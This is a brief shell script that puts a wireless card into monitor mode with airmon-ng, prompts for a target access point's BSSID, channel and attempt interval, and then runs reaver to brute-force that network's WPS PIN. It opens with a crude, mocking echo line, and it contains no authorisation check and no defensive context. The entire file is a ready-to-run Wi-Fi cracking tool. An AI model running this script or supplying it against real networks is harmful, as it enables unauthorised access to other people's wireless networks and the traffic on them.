echo Let's Reaver some bitches!

sleep 2

airmon-ng stop mon0
airmon-ng stop wlan1

airmon-ng start wlan1

echo Enter target's bssid
read bssid

echo Enter targets channel
read channel

echo Enter attempt interval, in seconds
read time

reaver -i mon0 -b $bssid -c $channel -t $time -vv
